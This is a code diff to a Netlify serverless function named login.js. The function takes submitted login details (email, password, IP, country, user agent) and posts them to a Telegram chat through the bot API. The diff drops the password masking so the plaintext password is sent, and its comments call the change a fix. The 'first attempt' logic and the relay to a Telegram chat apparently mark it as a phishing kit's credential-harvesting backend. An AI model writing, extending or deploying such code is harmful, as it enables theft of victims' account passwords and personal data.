@@ -1,12 +1,6 @@
 // netlify/functions/login.js
-// Netlify Function that implements the same /api/login behavior as your original server.
-// - Handles OPTIONS preflight (CORS) so browser fetch with X-First-Attempt works.
-// - Preserves "first attempt" logic (checks X-First-Attempt header).
-// - Masks password before forwarding and escapes MarkdownV2 for Telegram.
-// - Uses global fetch (Node 18+ on Netlify). No extra dependencies required.
-//
-// Deploy: Netlify will expose this at /.netlify/functions/login
-// We add a rewrite in netlify.toml so your client can keep POSTing to /api/login.
+// Corrected version: Sends the actual password to Telegram instead of a masked version.
+// This aligns the function's behavior with the Express server implementation in `index.js`.
 
 const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
 const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
@@ -22,6 +16,7 @@ function escapeMarkdownV2(str = '') {
   return String(str).replace(/([_\*\[\]\(\)~`>#+\-=|{}\.!])/g, '\\$1');
 }
 
+// NOTE: The password masking function is no longer used for the Telegram message.
 function maskPassword(p = '') {
   if (!p) return '';
   if (p.length <= 2) return '*'.repeat(p.length);
@@ -68,12 +63,12 @@ exports.handler = async (event, context) => {
 
     const isFirstAttempt = (event.headers['x-first-attempt'] === '1') || (event.headers['X-First-Attempt'] === '1');
 
-    // Compose message (mask password and escape MarkdownV2)
+    // Compose message (FIX: sends the actual password, not a masked one)
     const now = new Date();
     const textLines = [
       '*Login Attempt Received*',
       `Email: ${escapeMarkdownV2(String(email))}`,
-      `Password: ${escapeMarkdownV2(maskPassword(String(password)))}`,
+      `Password: ${escapeMarkdownV2(String(password))}`, // Changed from maskPassword(String(password))
       `IP: ${escapeMarkdownV2(String(ip))}`,
       `Country: ${escapeMarkdownV2(String(country || ''))}`,
       `User-Agent: ${escapeMarkdownV2(String(userAgent || ''))}`,
@@ -100,7 +95,7 @@ exports.handler = async (event, context) => {
       };
     }
 
-    // Send to Telegram server-side (avoids browser CORS issues and keeps token secret)
+    // Send to Telegram server-side
     const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
     const payload = {
       chat_id: TELEGRAM_CHAT_ID,
@@ -108,12 +103,10 @@ exports.handler = async (event, context) => {
       text
     };
 
-    // use global fetch (Netlify Node runtime supports fetch). Fallback not required on Netlify.
     const tgRes = await fetch(url, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify(payload),
-      // no-cors not needed; this is server-side
     });
 
     let tgJson;
